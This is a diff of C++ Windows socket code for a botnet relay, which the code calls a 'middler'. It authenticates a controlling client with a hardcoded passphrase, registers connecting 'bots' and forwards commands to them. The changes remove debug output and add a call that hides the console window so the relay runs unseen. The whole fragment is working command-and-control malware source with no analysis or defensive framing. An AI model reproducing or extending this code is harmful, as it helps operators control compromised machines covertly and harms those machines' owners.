@@ -16,7 +16,6 @@ DWORD IDThread;
 
 int hr;
 
-char msg[40];
 int s = sizeof(addr);
 
 
@@ -71,33 +70,30 @@ DWORD WINAPI inff(LPVOID g)
 	int d = 0;
 	while (true)
 	{
-		cout << "1" << endl;
 		Sleep(100);
 		sock = accept(sListen, (SOCKADDR*)&addr, &s);
 		if (sock == INVALID_SOCKET)
 		{
 			cout << "Error of socket" << endl;
+
 			return 0;
 		}
-		cout << "2" << endl;
 		recv(sock, msg2, sizeof(msg2), NULL);
-		cout << msg2 << 3 << endl;
 		//memcpy(gg, msg2, sizeof(msg2));
 		gg = msg2;
 		if (gg == "v86[wmxFBdX#5nb)rR@}MSzcu>ZC{j")
 		{
 			Cli = sock;
-			cout << "4" << endl;;
 			cout << "Client connected" << endl;
 			hThreadB = CreateThread(NULL, NULL, reces, NULL, NULL, &IDThread);
 		}
 		if (gg == "m")
 		{
 			Con[d] = sock; d++;
-			cout << "Bot" << d << " connected to middler." << endl; cout << "5" << endl;
+			cout << "Bot" << d << " connected to middler." << endl;
 			
 		}
-		if (d == 256) { d = 1; }
+		if (d == 256) { d = 0; }
 		
 	}
 
@@ -112,10 +108,10 @@ DWORD WINAPI reces(LPVOID d)
 	string m;
 	cout << msg << endl;
 	iResult = recv(Cli, msg, sizeof(msg), NULL);
+	Sleep(1000);
 	if (iResult < 0)
 	{
 		cout << "Recv failed" << endl;
-		goto t7;
 		return 0;
 	}
 	if (iResult == 0)
@@ -124,12 +120,10 @@ DWORD WINAPI reces(LPVOID d)
 		return 0;
 	}
 
-	if (m == "pong") { send(Cli, msg, sizeof(msg), NULL); goto t7; }
-
 	else
 	{
 		m = msg;
-		if (m == "ping" || m == "12")
+		if (m != "v86[wmxFBdX#5nb)rR@}MSzcu>ZC{j" || m != "m")
 		{
 			setn(msg);
 		}
@@ -141,7 +135,7 @@ DWORD WINAPI reces(LPVOID d)
 
 int main()
 {
-	setlocale(LC_ALL, "russian");
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
 
 
 	Wsa();
